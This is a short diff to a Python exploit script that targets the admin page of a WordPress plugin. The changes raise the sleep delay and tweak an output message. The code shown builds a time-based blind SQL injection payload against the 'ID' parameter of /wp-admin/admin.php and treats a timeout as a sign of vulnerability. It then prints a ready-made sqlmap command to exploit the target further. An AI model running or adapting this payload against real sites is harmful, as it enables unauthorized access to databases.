@@ -6,7 +6,7 @@ import re
 def blindsql(url):
 	url_endpoint = url + '/wp-admin/admin.php'
 	ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
-	sleep = 10
+	sleep = 15
 	payload="ID=1 AND (SELECT * from (select SLEEP(%s))a)"%(sleep)
 	url_encode = urlencode({'page':'wps_pages_page', 'type':'1', 'ID':payload}, quote_via=quote_plus)
 	try:
@@ -14,7 +14,7 @@ def blindsql(url):
 		print('(!) Target seem like not vuln!')
 		return False
 	except requests.ConnectTimeout:
-		print('(+) WwoowowoW maybe vuln ;)')
+		print('(+) WwoowowoW target maybe vuln ;)')
 		print('sqlmap -u \"%s\" --techniqu=T --dbms=\"mysql\" -p \"ID\" -b'%(url_endpoint +'?'+ url_encode))
 		return True
 def exploit(url):
